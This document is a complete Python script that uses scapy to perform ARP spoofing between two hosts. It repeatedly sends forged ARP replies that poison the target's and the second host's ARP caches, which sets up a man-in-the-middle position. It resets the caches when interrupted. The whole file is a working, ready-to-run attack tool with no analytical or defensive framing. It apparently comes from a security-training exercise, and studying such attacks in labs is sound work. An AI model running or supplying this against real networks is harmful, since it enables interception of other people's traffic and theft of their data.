#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-a", "--attacker", dest="attacker", help="Attacker IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info")
    if not options.attacker:
        parser.error("[-] Please specify an attacker IP, use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet=scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.attacker)
        spoof(options.attacker, options.target)
        sent_packets_count+=2
        print("\r[+] Pakets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C, resetting ARP tables")
    restore(options.target, options.attacker)
    restore(options.attacker, options.target)